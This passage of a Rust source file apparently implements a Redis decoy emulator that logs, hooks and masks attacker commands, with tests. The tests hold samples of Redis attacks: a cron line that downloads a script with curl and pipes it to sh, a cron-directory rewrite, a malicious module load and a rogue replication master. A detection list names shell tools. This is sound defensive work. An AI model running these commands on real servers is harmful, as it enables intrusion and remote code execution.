                "Replication" => self.replication_lines(&st),
                "Keyspace" if st.keys.is_empty() => Vec::new(),
                "Keyspace" => vec![format!("db0:keys={},expires=0,avg_ttl=0", st.keys.len())],
                _ => s
                    .fields
                    .iter()
                    .map(|f| {
                        let mut f = f.clone();
                        for (name, value) in &tokens {
                            f = f.replace(&format!("{{{name}}}"), value);
                        }
                        f
                    })
                    .collect(),
            };
            for l in lines {
                text.push_str(&l);
                text.push_str("\r\n");
            }
            sections.push(text);
        }
        sections.join("\r\n")
    }

    fn replication_lines(&self, st: &State) -> Vec<String> {
        let mut out = Vec::new();
        match &st.replica_of {
            None => out.push("role:master".to_string()),
            Some((host, port)) => {
                out.push("role:slave".into());
                out.push(format!("master_host:{host}"));
                out.push(format!("master_port:{port}"));
                out.extend(
                    [
                        "master_link_status:down",
                        "master_last_io_seconds_ago:-1",
                        "master_sync_in_progress:0",
                        "slave_read_repl_offset:0",
                        "slave_repl_offset:0",
                        "master_link_down_since_seconds:-1",
                        "slave_priority:100",
                        "slave_read_only:1",
                        "replica_announced:1",
                    ]
                    .map(String::from),
                );
            }
        }
        out.extend([
            "connected_slaves:0".to_string(),
            "master_failover_state:no-failover".to_string(),
            format!("master_replid:{}", self.replid),
            "master_replid2:0000000000000000000000000000000000000000".to_string(),
            "master_repl_offset:0".to_string(),
            "second_repl_offset:-1".to_string(),
            "repl_backlog_active:0".to_string(),
            "repl_backlog_size:1048576".to_string(),
            "repl_backlog_first_byte_offset:0".to_string(),
            "repl_backlog_histlen:0".to_string(),
        ]);
        out
    }

    /// Hook points matched by a command that reached its handler.
    pub fn matching_hooks(&self, args: &[Vec<u8>]) -> Vec<&HookPoint> {
        let name = upper(&args[0]);
        let full = args
            .get(1)
            .map(|s| format!("{name} {}", upper(s)))
            .unwrap_or_default();
        self.hooks
            .iter()
            .filter(|h| {
                let Some(cmd) = h.on.command.as_deref() else {
                    return false;
                };
                // `|` separates alternatives, for example `SLAVEOF|REPLICAOF`.
                let words = cmd.split('|').find_map(|c| {
                    if c.eq_ignore_ascii_case(&name) {
                        Some(1)
                    } else if c.eq_ignore_ascii_case(&full) {
                        Some(2)
                    } else {
                        None
                    }
                });
                let Some(words) = words else {
                    return false;
                };
                match h.on.arg.as_deref() {
                    None => true,
                    Some(arg) => args
                        .iter()
                        .skip(words)
                        .any(|a| arg.split('|').any(|x| a.eq_ignore_ascii_case(x.as_bytes()))),
                }
            })
            .collect()
    }

    fn hook_event(&self, conn: &mut Conn, hook: &HookPoint, args: &[Vec<u8>]) -> HookEvent {
        conn.hook_seq += 1;
        let line: Vec<String> = logged_args(args)
            .iter()
            .take(LOG_ARGS)
            .map(|a| printable(a, 128))
            .collect();
        HookEvent {
            hook_id: hook.id.clone(),
            catalogue_id: self.sink.context().catalogue_id.clone(),
            cve_id: hook.cve_id.clone(),
            stage: hook.stage,
            request_slice_ref: None,
            sequence_no: conn.hook_seq,
            t_offset_ms: conn.started.elapsed().as_millis() as u64,
            cmd_lines: Vec::new(),
            file_writes: Vec::new(),
            implant_refs: Vec::new(),
            notes: Some(clip(line.join(" ").as_bytes(), 512)),
        }
    }
}

fn arity(name: &str) -> (usize, Option<usize>) {
    match name {
        "PING" => (1, Some(2)),
        "AUTH" => (2, Some(3)),
        "INFO" | "COMMAND" | "QUIT" => (1, None),
        "CONFIG" | "MODULE" => (2, None),
        "SET" => (3, None),
        "GET" | "KEYS" | "SELECT" | "ECHO" => (2, Some(2)),
        "SLAVEOF" | "REPLICAOF" => (3, Some(3)),
        "SAVE" | "DBSIZE" => (1, Some(1)),
        "BGSAVE" | "FLUSHALL" => (1, Some(2)),
        _ => (1, None),
    }
}

const REDACTED: &str = "REDACTED";

/// `args` with credential arguments masked, for anything that is logged.
fn logged_args(args: &[Vec<u8>]) -> Vec<Vec<u8>> {
    let tokens: Vec<String> = args
        .iter()
        .map(|a| String::from_utf8_lossy(a).into_owned())
        .collect();
    let hits = secret_arg_positions(&tokens);
    args.iter()
        .enumerate()
        .map(|(i, a)| {
            if hits.contains(&i) {
                mask_secret_arg(&tokens[i]).into_bytes()
            } else {
                a.clone()
            }
        })
        .collect()
}

/// Mask credential arguments in an outcome's logged data: `args` (offset by
/// the subcommand when it is logged apart), `config_set` values and the
/// quoted copies in the unclipped `error`.
/// Each masked value is recorded as `{index, sha256, len}` in
/// `redacted_args`, the way AUTH keeps `password_sha256`.
fn scrub_secrets(data: &mut Map<String, Value>, args: &[Vec<u8>]) {
    let tokens: Vec<String> = args
        .iter()
        .map(|a| String::from_utf8_lossy(a).into_owned())
        .collect();
    let hits = secret_arg_positions(&tokens);
    if hits.is_empty() {
        return;
    }
    let offset = if data.contains_key("subcommand") {
        2
    } else {
        1
    };
    if let Some(Value::Array(logged)) = data.get_mut("args") {
        for &i in &hits {
            if let Some(v) = i.checked_sub(offset).and_then(|j| logged.get_mut(j)) {
                *v = json!(mask_secret_arg(&tokens[i]));
            }
        }
    }
    if let Some(Value::Object(set)) = data.get_mut("config_set") {
        for &i in &hits {
            if i >= 3 {
                let name = printable(&args[i - 1], 128).to_ascii_lowercase();
                if let Some(v) = set.get_mut(&name) {
                    *v = json!(REDACTED);
                }
            }
        }
    }
    if let Some(Value::String(err)) = data.get_mut("error") {
        let mut e = err.clone();
        for &i in &hits {
            let masked = mask_secret_arg(&tokens[i]);
            // Errors quote arguments as `'{printable(arg, 128)}'`, whole,
            // because the error is clipped only after this.
            let form = printable(&args[i], 128);
            if !form.is_empty() {
                e = e.replace(&format!("'{form}'"), &format!("'{masked}'"));
            }
        }
        *err = e;
    }
    let redacted: Vec<Value> = hits
        .iter()
        .map(|&i| json!({"index": i, "sha256": sha256_hex(&args[i]), "len": args[i].len()}))
        .collect();
    data.insert("redacted_args".into(), Value::Array(redacted));
}

fn log_args(data: &mut Map<String, Value>, args: &[Vec<u8>]) {
    if args.is_empty() || data.contains_key("args") {
        return;
    }
    let shown: Vec<String> = args
        .iter()
        .take(LOG_ARGS)
        .map(|a| clip(a, ARG_CLIP))
        .collect();
    data.insert("args".into(), json!(shown));
    if args.len() > LOG_ARGS {
        data.insert("args_total".into(), json!(args.len()));
    }
}

/// What a stored value looks like, without keeping it: cron lines and SSH
/// keys are the classic payloads of the config-rewrite attack.
fn payload_markers(v: &[u8]) -> Vec<&'static str> {
    let text = String::from_utf8_lossy(&v[..v.len().min(MAX_BULK)]).to_ascii_lowercase();
    let mut out = Vec::new();
    if text.contains("* * * *") || text.contains("*/") || text.contains("@reboot") {
        out.push("cron_line");
    }
    if text.contains("ssh-rsa ") || text.contains("ssh-ed25519 ") || text.contains("ecdsa-sha2-") {
        out.push("ssh_key");
    }
    if text.contains("http://") || text.contains("https://") {
        out.push("url");
    }
    if [
        "/bin/sh",
        "/bin/bash",
        "bash -i",
        "wget ",
        "curl ",
        "/dev/tcp/",
    ]
    .iter()
    .any(|m| text.contains(m))
    {
        out.push("shell");
    }
    out
}

fn human_bytes(n: u64) -> String {
    if n < 1024 * 1024 {
        format!("{:.2}K", n as f64 / 1024.0)
    } else {
        format!("{:.2}M", n as f64 / (1024.0 * 1024.0))
    }
}

// ---------------------------------------------------------------------------
// Serving

impl Session for Core {
    async fn run(
        self: Arc<Self>,
        mut stream: TcpStream,
        peer: SocketAddr,
        local: SocketAddr,
        session_no: u64,
    ) {
        let mut conn = self.connect(local.port());
        let mut rng = Rng::seeded(self.seed ^ session_no.wrapping_mul(0x9E37_79B9_7F4A_7C15));
        let session = format!("{}-s{session_no}", self.sink.context().id_prefix);
        let idle = Duration::from_secs(u64::from(self.settings.idle_timeout_s));
        let mut buf: Vec<u8> = Vec::with_capacity(4096);
        let mut chunk = [0u8; 8192];
        'conn: loop {
            let mut out = Vec::new();
            loop {
                match parse_command(&buf) {
                    Ok(Some((args, used))) => {
                        buf.drain(..used);
                        if args.is_empty() {
                            continue;
                        }
                        let o = self.execute(&mut conn, &args);
                        self.emit(&mut conn, &session, peer, local, &args, &o);
                        out.extend_from_slice(&o.reply);
                        if conn.close {
                            break;
                        }
                    }
                    Ok(None) => break,
                    Err(e) => {
                        let mut data = Map::new();
                        data.insert("protocol".into(), json!("redis"));
                        data.insert("session".into(), json!(session));
                        data.insert("result".into(), json!("protocol_error"));
                        data.insert("error".into(), json!(e.reply().trim_end()));
                        self.sink
                            .emit(Event::application(peer, local, Severity::Low, data));
                        out.extend_from_slice(e.reply().as_bytes());
                        conn.close = true;
                        break;
                    }
                }
            }
            if !out.is_empty() {
                self.jitter.wait(&mut rng).await;
                if stream.write_all(&out).await.is_err() {
                    break 'conn;
                }
            }
            if conn.close {
                break;
            }
            if buf.len() > MAX_QUERY_BUFFER {
                let mut data = Map::new();
                data.insert("protocol".into(), json!("redis"));
                data.insert("session".into(), json!(session));
                data.insert("result".into(), json!("query_buffer_limit"));
                self.sink
                    .emit(Event::application(peer, local, Severity::Low, data));
                break;
            }
            match tokio::time::timeout(idle, stream.read(&mut chunk)).await {
                Ok(Ok(n)) if n > 0 => buf.extend_from_slice(&chunk[..n]),
                _ => break,
            }
        }
        let _ = stream.shutdown().await;
        self.disconnect();
    }
}

impl Core {
    fn emit(
        &self,
        conn: &mut Conn,
        session: &str,
        peer: SocketAddr,
        local: SocketAddr,
        args: &[Vec<u8>],
        o: &Outcome,
    ) {
        let mut data = o.data.clone();
        data.insert("session".into(), json!(session));
        self.sink
            .emit(Event::application(peer, local, o.severity, data.clone()));
        if !o.reached {
            return;
        }
        for hook in self.matching_hooks(args) {
            let he = self.hook_event(conn, hook, args);
            let mut hd = Map::new();
            hd.insert("protocol".into(), json!("redis"));
            hd.insert("session".into(), json!(session));
            hd.insert("command".into(), data["command"].clone());
            self.sink
                .emit(Event::hook(peer, local, hook.severity, he, hd));
        }
    }
}

/// The Redis plug-in.
#[derive(Default)]
pub struct RedisEmulator {
    server: Server,
}

impl RedisEmulator {
    pub fn new() -> Self {
        Self::default()
    }
}

impl Emulator for RedisEmulator {
    fn name(&self) -> &'static str {
        PLUGIN
    }

    fn profiles(&self) -> Vec<&'static str> {
        Profile::builtin_ids(PLUGIN)
    }

    fn start(
        &mut self,
        profile: &Profile,
        listener: TcpListener,
        sink: EventSink,
    ) -> Result<(), EmulatorError> {
        let core = Core::new(profile, sink, &mut Rng::from_entropy())?;
        self.server.start(listener, Arc::new(core))
    }

    fn stop(&mut self) -> BoxFuture<'_, ()> {
        self.server.stop()
    }

    fn health(&self) -> Health {
        self.server.health()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sink::SinkContext;
    use std::collections::BTreeMap;

    fn rendered() -> Profile {
        let p = Profile::builtin("redis-7.0").unwrap();
        let values: BTreeMap<String, String> = p
            .canaries
            .iter()
            .map(|c| (c.name.clone(), format!("cnry_{}", c.name)))
            .collect();
        let mut p = p.render(&values).unwrap();
        p.jitter = Jitter::NONE;
        p
    }

    fn core() -> Core {
        let (sink, _rx) = EventSink::new(SinkContext::new("dcy-redis-1", "emulator/redis/7.0"), 64);
        Core::new(&rendered(), sink, &mut Rng::seeded(1)).unwrap()
    }

    fn cmd(parts: &[&str]) -> Vec<Vec<u8>> {
        parts.iter().map(|p| p.as_bytes().to_vec()).collect()
    }

    fn run(core: &Core, conn: &mut Conn, parts: &[&str]) -> String {
        String::from_utf8_lossy(&core.execute(conn, &cmd(parts)).reply).into_owned()
    }

    #[test]
    fn parses_multibulk_inline_and_partial_input() {
        let (args, used) = parse_command(b"*2\r\n$3\r\nGET\r\n$1\r\nk\r\nrest")
            .unwrap()
            .unwrap();
        assert_eq!(args, cmd(&["GET", "k"]));
        assert_eq!(used, 20);
        assert_eq!(parse_command(b"*2\r\n$3\r\nGET\r\n$1\r\n").unwrap(), None);
        let (args, _) = parse_command(b"set k \"a b\\x41\\n\" 'c d'\r\n")
            .unwrap()
            .unwrap();
        assert_eq!(
            args,
            vec![
                b"set".to_vec(),
                b"k".to_vec(),
                b"a bA\n".to_vec(),
                b"c d".to_vec()
            ]
        );
        assert_eq!(parse_command(b"PING").unwrap(), None);
        assert_eq!(parse_command(b"*0\r\n").unwrap(), Some((Vec::new(), 4)));
    }

    #[test]
    fn protocol_errors_match_redis_wording() {
        assert_eq!(
            parse_command(b"*abc\r\n").unwrap_err().reply(),
            "-ERR Protocol error: invalid multibulk length\r\n"
        );
        assert_eq!(
            parse_command(b"*1\r\n:3\r\n").unwrap_err().reply(),
            "-ERR Protocol error: expected '$', got ':'\r\n"
        );
        assert_eq!(
            parse_command(format!("*1\r\n${}\r\n", MAX_BULK + 1).as_bytes()).unwrap_err(),
            ProtocolError::InvalidBulkLength
        );
        assert_eq!(
            parse_command(b"*99999\r\n").unwrap_err(),
            ProtocolError::InvalidMultibulkLength
        );
        assert_eq!(
            parse_command(b"GET \"oops\r\n").unwrap_err(),
            ProtocolError::UnbalancedQuotes
        );
        assert_eq!(
            parse_command(&vec![b'a'; MAX_INLINE + 2]).unwrap_err(),
            ProtocolError::TooBigInline
        );
        assert_eq!(
            parse_command(&[b'*'; 40]).unwrap_err(),
            ProtocolError::TooBigMbulkCount
        );
    }

    #[test]
    fn replies_match_redis_7_0() {
        let c = core();
        let mut conn = c.connect(6379);
        assert_eq!(run(&c, &mut conn, &["ping"]), "+PONG\r\n");
        assert_eq!(run(&c, &mut conn, &["PING", "hi"]), "$2\r\nhi\r\n");
        assert_eq!(
            run(&c, &mut conn, &["FOO", "a", "b"]),
            "-ERR unknown command 'FOO', with args beginning with: 'a' 'b' \r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["GET"]),
            "-ERR wrong number of arguments for 'get' command\r\n"
        );
        assert_eq!(run(&c, &mut conn, &["SET", "k", "v"]), "+OK\r\n");
        assert_eq!(run(&c, &mut conn, &["GET", "k"]), "$1\r\nv\r\n");
        assert_eq!(run(&c, &mut conn, &["GET", "missing"]), "$-1\r\n");
        assert_eq!(
            run(&c, &mut conn, &["AUTH", "x"]),
            "-ERR AUTH <password> called without any password configured for the default user. Are you sure your configuration is correct?\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["MODULE", "LOAD", "/tmp/exp.so"]),
            "-ERR Error loading the extension. Please check the server logs.\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["CONFIG", "GET", "dbfilename"]),
            "*2\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["CONFIG", "SET", "nope", "1"]),
            "-ERR Unknown option or number of arguments for CONFIG SET - 'nope'\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["CONFIG", "FLY"]),
            "-ERR unknown subcommand 'FLY'. Try CONFIG HELP.\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["SLAVEOF", "192.0.2.1", "8886"]),
            "+OK\r\n"
        );
        assert!(
            c.info(&cmd(&["replication"]), 6379)
                .contains("master_host:192.0.2.1")
        );
        assert_eq!(run(&c, &mut conn, &["REPLICAOF", "NO", "ONE"]), "+OK\r\n");
        assert_eq!(
            run(&c, &mut conn, &["SLAVEOF", "192.0.2.1", "port"]),
            "-ERR Invalid master port\r\n"
        );
        assert_eq!(run(&c, &mut conn, &["QUIT"]), "+OK\r\n");
        assert!(conn.close);
    }

    #[test]
    fn config_set_dir_is_suspicious_and_hooked() {
        let c = core();
        let mut conn = c.connect(6379);
        let args = cmd(&["CONFIG", "SET", "dir", "/var/spool/cron"]);
        let o = c.execute(&mut conn, &args);
        assert_eq!(o.reply, b"+OK\r\n");
        assert_eq!(o.severity, Severity::High);
        assert_eq!(o.data["config_set"]["dir"], json!("/var/spool/cron"));
        let hooks: Vec<&str> = c
            .matching_hooks(&args)
            .iter()
            .map(|h| h.id.as_str())
            .collect();
        assert_eq!(hooks, vec!["redis.config-set-persistence"]);
        let save = c.execute(&mut conn, &cmd(&["SAVE"]));
        assert_eq!(save.severity, Severity::High);
        assert_eq!(save.data["save_path"], json!("/var/spool/cron/dump.rdb"));
        assert!(c.matching_hooks(&cmd(&["CONFIG", "GET", "dir"])).is_empty());
    }

    #[test]
    fn set_values_are_hashed_with_markers() {
        let c = core();
        let mut conn = c.connect(6379);
        let o = c.execute(
            &mut conn,
            &cmd(&[
                "SET",
                "x",
                "\n\n*/1 * * * * curl -fsSL http://192.0.2.9/a.sh | sh\n\n",
            ]),
        );
        assert_eq!(o.severity, Severity::Medium);
        assert_eq!(o.data["args"], json!(["x"]));
        assert_eq!(o.data["markers"], json!(["cron_line", "url", "shell"]));
        assert!(
            !serde_json::to_string(&o.data)
                .unwrap()
                .contains("192.0.2.9")
        );
    }

    #[test]
    fn requirepass_gates_commands() {
        let c = core();
        let mut admin = c.connect(6379);
        assert_eq!(
            run(&c, &mut admin, &["CONFIG", "SET", "requirepass", "s3cret"]),
            "+OK\r\n"
        );
        let mut conn = c.connect(6379);
        assert!(!conn.authed);
        assert_eq!(
            run(&c, &mut conn, &["GET", "k"]),
            "-NOAUTH Authentication required.\r\n"
        );
        assert_eq!(
            run(&c, &mut conn, &["AUTH", "wrong"]),
            "-WRONGPASS invalid username-password pair or user is disabled.\r\n"
        );
        assert_eq!(run(&c, &mut conn, &["AUTH", "s3cret"]), "+OK\r\n");
        assert_eq!(run(&c, &mut conn, &["PING"]), "+PONG\r\n");
    }

    #[test]
    fn info_has_the_claimed_version_and_moving_values() {
        let c = core();
        let info = c.info(&[], 6379);
        assert!(info.starts_with("# Server\r\nredis_version:7.0.11\r\n"));
        assert!(info.ends_with("\r\n"));
        assert!(!info.contains('{'), "unrendered token in INFO");
        assert!(info.contains("# Keyspace\r\ndb0:keys="));
        let server_only = c.info(&cmd(&["server"]), 6379);
        assert!(!server_only.contains("# Clients"));
    }

    /// Deterministic pseudo-random inputs: arbitrary bytes, split into
    /// arbitrary chunks, must never panic the parser or the executor.
    #[test]
    fn arbitrary_bytes_never_panic() {
        let c = core();
        let mut rng = Rng::seeded(0xF0F0_1234);
        let alphabet: &[u8] = b"*$\r\n0123456789-\"' \\xPINGSETCONFIGMODULE";
        for round in 0..3000 {
            let len = rng.range(0, 600) as usize;
            let bytes: Vec<u8> = (0..len)
                .map(|_| {
                    if round % 2 == 0 {
                        rng.next_u64() as u8
                    } else {
                        alphabet[rng.range(0, alphabet.len() as u64 - 1) as usize]
                    }
                })
                .collect();
            let mut conn = c.connect(6379);
            let mut buf = Vec::new();
            for piece in bytes.chunks(rng.range(1, 64) as usize) {
                buf.extend_from_slice(piece);
                while let Ok(Some((args, used))) = parse_command(&buf) {
                    assert!(used <= buf.len() && used > 0);
                    buf.drain(..used);
                    assert!(args.len() <= MAX_ARGS);
                    if !args.is_empty() {
                        let o = c.execute(&mut conn, &args);
                        assert!(matches!(
                            o.reply.first(),
                            Some(b'+' | b'-' | b'$' | b'*' | b':')
                        ));
                        let _ = c.matching_hooks(&args);
                    }
                }
            }
        }
    }

    #[test]
    fn arbitrary_argument_vectors_never_panic() {
        let c = core();
        let mut rng = Rng::seeded(99);
        let names = [
            "CONFIG",
            "MODULE",
            "SET",
            "GET",
            "KEYS",
            "AUTH",
            "SLAVEOF",
            "REPLICAOF",
            "INFO",
            "SELECT",
            "PING",
            "SAVE",
            "FLUSHALL",
            "ECHO",
            "BGSAVE",
            "COMMAND",
            "DBSIZE",
        ];
        for _ in 0..5000 {
            let mut conn = c.connect(6379);
            let mut args = vec![
                names[rng.range(0, names.len() as u64 - 1) as usize]
                    .as_bytes()
                    .to_vec(),
            ];
            for _ in 0..rng.range(0, 6) {
                let len = rng.range(0, 40) as usize;
                args.push((0..len).map(|_| rng.next_u64() as u8).collect());
            }
            let o = c.execute(&mut conn, &args);
            assert!(!o.reply.is_empty());
        }
    }

    #[test]
    fn credentials_are_masked_in_logged_data_but_not_in_replies() {
        let c = core();
        let mut conn = c.connect(6379);
        let pw = "hunter2";
        let hidden = |o: &Outcome| {
            let text = serde_json::to_string(&o.data).unwrap();
            assert!(!text.contains(pw), "{text}");
            o.data["redacted_args"].clone()
        };

        // Unknown commands echo their arguments to the client, as Redis
        // does, but the logged error and args are masked.
        let o = c.execute(&mut conn, &cmd(&["HELLO", "3", "AUTH", "default", pw]));
        assert!(String::from_utf8_lossy(&o.reply).contains(pw));
        assert_eq!(o.data["args"], json!(["3", "AUTH", "REDACTED", "REDACTED"]));
        assert!(o.data["error"].as_str().unwrap().contains("'REDACTED'"));
        assert_eq!(
            hidden(&o),
            json!([
                {"index": 3, "sha256": sha256_hex(b"default"), "len": 7},
                {"index": 4, "sha256": sha256_hex(pw.as_bytes()), "len": 7}
            ])
        );

        // Short arity fails closed: everything after the keyword.
        let o = c.execute(&mut conn, &cmd(&["HELLO", "3", "AUTH", pw]));
        assert_eq!(o.data["args"], json!(["3", "AUTH", "REDACTED"]));
        hidden(&o);
        let o = c.execute(&mut conn, &cmd(&["SENTINEL", "SET", "m", "auth-pass", pw]));
        assert_eq!(o.data["args"][3], json!("REDACTED"));
        hidden(&o);

        let o = c.execute(
            &mut conn,
            &cmd(&[
                "MIGRATE",
                "192.0.2.10",
                "6379",
                "k",
                "0",
                "5000",
                "AUTH2",
                "u",
                pw,
            ]),
        );
        assert_eq!(o.data["args"][6], json!("REDACTED"));
        assert_eq!(o.data["args"][7], json!("REDACTED"));
        hidden(&o);

        let o = c.execute(
            &mut conn,
            &cmd(&["ACL", "SETUSER", "bob", "on", &format!(">{pw}")]),
        );
        assert_eq!(o.data["args"][3], json!(">REDACTED"));
        hidden(&o);

        let o = c.execute(&mut conn, &cmd(&["XYZZY", "PASSWORD", pw, "api_key=abc"]));
        assert_eq!(
            o.data["args"],
            json!(["PASSWORD", "REDACTED", "api_key=REDACTED"])
        );
        assert!(!o.data["error"].as_str().unwrap().contains("abc"));
        hidden(&o);

        // Masking happens before the error is clipped, so a secret that
        // straddles the clip, or holds quotes, never leaks a part.
        for pad in 180..230 {
            for secret in ["hunter2", "it's'hunter2", "'hunter2'"] {
                let long = "x".repeat(pad);
                let o = c.execute(&mut conn, &cmd(&["XYZZY", &long, "AUTH", secret]));
                let err = o.data["error"].as_str().unwrap();
                assert!(err.len() <= 256);
                assert!(
                    !err.contains("hun") && !err.contains("it's"),
                    "{pad}: {err}"
                );
                assert!(!serde_json::to_string(&o.data).unwrap().contains("hunter2"));
            }
        }

        // CONFIG SET requirepass: masked in args and config_set, applied for
        // real, and still readable by the client.
        let o = c.execute(&mut conn, &cmd(&["CONFIG", "SET", "requirepass", pw]));
        assert_eq!(o.data["subcommand"], json!("SET"));
        assert_eq!(o.data["args"], json!(["requirepass", "REDACTED"]));
        assert_eq!(o.data["config_set"], json!({"requirepass": "REDACTED"}));
        assert_eq!(hidden(&o)[0]["index"], json!(3));
        assert!(run(&c, &mut conn, &["CONFIG", "GET", "requirepass"]).contains(pw));

        // AUTH with the wrong arity logs its arguments, masked.
        let o = c.execute(&mut conn, &cmd(&["AUTH", "a", "b", pw]));
        assert_eq!(o.data["args"], json!(["REDACTED", "REDACTED", "REDACTED"]));
        hidden(&o);

        // Nothing to hide: no redacted_args.
        let o = c.execute(&mut conn, &cmd(&["CONFIG", "SET", "dir", "/tmp"]));
        assert!(o.data.get("redacted_args").is_none());
    }
}
